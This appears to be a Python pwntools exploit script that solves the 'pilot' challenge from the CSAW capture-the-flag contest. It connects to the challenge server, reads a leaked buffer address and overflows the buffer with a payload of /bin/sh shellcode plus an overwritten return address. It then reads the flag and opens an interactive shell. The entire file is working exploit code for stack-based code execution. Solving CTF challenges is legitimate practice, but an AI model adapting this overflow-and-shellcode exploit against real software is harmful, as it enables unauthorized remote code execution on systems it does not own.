from pwn import *
from time import sleep
import struct

#s = process("./pilot")
s = remote("pwn.chal.csaw.io",8464)

raw_input("Waiting on GDB")

# Recv irrelevant data
s.recvuntil("Location:")

# Get buf location
stuff = s.recvuntil("\n")
buf_addr = int(stuff.strip()[2::],16)
log.info("Got {0}".format(hex(buf_addr)))

f = open("code.o","rb")
shellcode = f.read()
f.close()

# Payload, /bin/sh shellcode
payload = bytearray()
payload += shellcode
payload = payload + "A"*(40-len(payload))
payload += p64(buf_addr)

s.recvuntil("Command:")
s.sendline(payload)

log.warn("Enjoy your shell :)")
s.sendline("cat flag")
s.interactive()

s.close()
